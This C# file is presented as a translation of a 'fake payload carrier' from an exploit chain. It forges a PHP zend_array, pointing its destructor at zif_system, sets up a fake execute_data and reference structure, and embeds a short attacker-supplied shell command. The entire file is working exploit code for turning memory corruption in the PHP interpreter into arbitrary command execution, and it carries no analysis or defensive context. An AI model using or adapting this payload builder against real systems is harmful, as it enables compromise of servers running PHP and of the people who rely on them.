// Translation of the recovered lib/chain.py _fake_payload carrier.
using System;
using System.Buffers.Binary;

public static class Carrier {
    public static (byte[], byte[]) Build(ulong htdata, ulong zif_system, byte[] cmd) {
        if (cmd.Length > 14) throw new ArgumentException("command length");
        byte[] zend_array = new byte[167];
        ulong pDestructor = zif_system;
        int execute_data = 0x20;
        byte[] reference = new byte[55];
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(0), (uint)(1));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan((0) + 4), (uint)(7));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(8), (uint)(16));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan((8) + 4), (uint)(4294967288));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(16), (ulong)(htdata + 32));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(24), (uint)(1));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan((24) + 4), (uint)(1));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(32), (uint)(8));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan((32) + 4), (uint)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(40), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(48), (ulong)(pDestructor));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 0), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 8), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 16), (ulong)(pDestructor));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 24), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 32), (ulong)(0));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(execute_data + 40), (uint)(0));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(execute_data + 44), (uint)(1));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 48), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 56), (ulong)(0));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(execute_data + 64), (uint)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(execute_data + 80), (ulong)(htdata + 128));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(execute_data + 88), (uint)(6));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan(128), (uint)(1));
        BinaryPrimitives.WriteUInt32LittleEndian(zend_array.AsSpan((128) + 4), (uint)(262));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(136), (ulong)(0));
        BinaryPrimitives.WriteUInt64LittleEndian(zend_array.AsSpan(144), (ulong)(cmd.Length));
        BinaryPrimitives.WriteUInt32LittleEndian(reference.AsSpan(16), (uint)(1));
        BinaryPrimitives.WriteUInt32LittleEndian(reference.AsSpan((16) + 4), (uint)(10));
        BinaryPrimitives.WriteUInt64LittleEndian(reference.AsSpan(24), (ulong)(htdata));
        BinaryPrimitives.WriteUInt64LittleEndian(reference.AsSpan(32), (ulong)(775));
        BinaryPrimitives.WriteUInt64LittleEndian(reference.AsSpan(40), (ulong)(0));
        cmd.CopyTo(zend_array, 0x98);
        zend_array[0x98 + cmd.Length] = 0;
        return (zend_array, reference);
    }
}
